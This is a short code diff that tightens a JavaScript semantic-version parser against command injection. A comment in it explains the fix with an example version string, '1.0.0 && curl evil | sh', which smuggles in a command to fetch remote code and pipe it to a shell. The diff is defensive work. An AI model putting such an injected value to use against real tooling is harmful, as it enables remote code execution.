@@ -15,7 +15,12 @@
  */
 export function parseSemver(v) {
   if (typeof v !== 'string') return null;
-  const m = /^(\d+)\.(\d+)\.(\d+)/.exec(v.trim());
+  // Fully anchored: `major.minor.patch` with an optional semver
+  // prerelease/build tail restricted to the semver identifier charset
+  // ([0-9A-Za-z.-]). The previous pattern was start-anchored only, so a
+  // version like `1.0.0 && curl evil | sh` still parsed as a valid bump and
+  // its shell metacharacters survived into any string-interpolated command.
+  const m = /^(\d+)\.(\d+)\.(\d+)(?:[-+][0-9A-Za-z.-]+)?$/.exec(v.trim());
   if (m === null) return null;
   return { major: Number(m[1]), minor: Number(m[2]), patch: Number(m[3]) };
 }
